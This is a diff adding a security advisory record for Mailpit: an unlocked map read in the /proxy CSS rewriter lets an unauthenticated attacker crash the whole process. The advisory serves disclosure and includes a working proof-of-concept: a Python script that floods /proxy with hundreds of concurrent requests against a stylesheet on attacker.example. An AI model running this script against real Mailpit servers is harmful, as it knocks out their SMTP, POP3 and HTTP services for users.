@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-w4vj-r5pg-3722",
+  "modified": "2026-05-19T16:00:11.906261768Z",
+  "published": "2026-05-19T15:53:52Z",
+  "aliases": [
+    "CVE-2026-45712"
+  ],
+  "summary": "Mailpit: Concurrent map read \u0026 write in proxy CSS rewriter - remote unauth crash (fatal error: concurrent map read and map write)",
+  "details": "### Summary\nThe screenshot/print proxy (/proxy?data=…) maintains a package-level assets map[string]MessageAssets cache, but reads the map without holding assetsMutex while a long-running cleanup goroutine and (re-entrant) CSS-rewriting code path concurrently write to it under the lock. When the unsynchronized read coincides with a synchronized write, Go's runtime raises fatal error: concurrent map read and map write — a runtime.throw that is not recoverable by http.Server's handler-panic recover. The whole Mailpit process exits, taking the SMTP, POP3 and HTTP listeners down with it.\n\n### Details\nA remote, unauthenticated attacker who can (1) reach /proxy and (2) plant any message with a stylesheet link in the inbox can crash Mailpit by issuing concurrent /proxy?data=… requests against the same message's CSS URL. Mailpit's defaults make both prerequisites trivial: the SMTP listener accepts mail anonymously, the HTTP listener accepts requests anonymously, and the cleanup goroutine fires every minute regardless of whether the map is being read.\n\nAffected code\n[server/handlers/proxy.go:198-229](https://github.com/axllent/mailpit/blob/develop/server/handlers/proxy.go#L198-L229)\n[server/handlers/proxy.go:52-66](https://github.com/axllent/mailpit/blob/develop/server/handlers/proxy.go#L52-L66)\n[server/handlers/proxy.go:244-313](https://github.com/axllent/mailpit/blob/develop/server/handlers/proxy.go#L244-L313) \n\nGo's map runtime sets a hashWriting flag at the start of any write op. Concurrent map reads check the flag and call throw(\"concurrent map read and map write\") — throw is not caught by defer recover and is not caught by http.Server's handler-panic guard. The process exits with a stack trace.\n\n### PoC\n1. Deposit any message with a \u003clink rel=\"stylesheet\" href=\"https://attacker.example/big.css\"\u003e in the store (SMTP or /api/v1/send, both unauthenticated by default).\n2. Make a few hundred concurrent requests to /proxy?data=base64(\u003cid\u003e:https://attacker.example/big.css) — the attacker's big.css should be ~50 MiB and contain thousands of url(...) entries so each request spends time iterating the rewriter loop and touching assets[id] repeatedly.\n\nSkeleton (set --allow-internal-http-requests only if you're testing locally — internal IPs are blocked by safeDialContext in production, which is correct):\n\n```\n# proxy-race.py\nimport socket, threading, base64, sys\n\nID = sys.argv[1]                                   # 22-char shortuuid\nCSS = \"https://attacker.example/big.css\"\nTOKEN = base64.b64encode(f\"{ID}:{CSS}\".encode()).decode()\n\nreq = (\n    f\"GET /proxy?data={TOKEN} HTTP/1.1\\r\\n\"\n    f\"Host: target:8025\\r\\n\"\n    f\"Connection: close\\r\\n\\r\\n\"\n).encode()\n\ndef hit():\n    try:\n        s = socket.create_connection((\"target\", 8025), timeout=10)\n        s.sendall(req)\n        while s.recv(8192): pass\n        s.close()\n    except Exception: pass\n\nfor _ in range(50):                                # 50 rounds\n    ts = [threading.Thread(target=hit) for _ in range(300)]\n    for t in ts: t.start()\n    for t in ts: t.join()\n```\n\nWhen the unlocked read at line 216 happens during a delete() from the cleanup goroutine, or during another goroutine's assets[id] = result write, Go's runtime emits:\n\n```\nfatal error: concurrent map read and map write\n\ngoroutine 123 [running]:\nruntime.throw(...)\ngithub.com/axllent/mailpit/server/handlers.ProxyHandler(...)\n        server/handlers/proxy.go:216\n...\n```\n\n…and the process exits. Building Mailpit with go build -race produces a deterministic WARNING: DATA RACE trace at the same line under the same workload, confirming the access pattern is racy even without timing-based crash demonstration.\n\n### Impact\nUnauthenticated remote attacker can trigger a concurrent map access crash in /proxy, causing a fatal runtime panic and full Mailpit process termination (DoS).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/axllent/mailpit",
+        "purl": "pkg:golang/github.com/axllent/mailpit"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.30.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-w4vj-r5pg-3722/GHSA-w4vj-r5pg-3722.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/security/advisories/GHSA-w4vj-r5pg-3722"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/axllent/mailpit"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/releases/tag/v1.30.0"
+    }
+  ]
+}
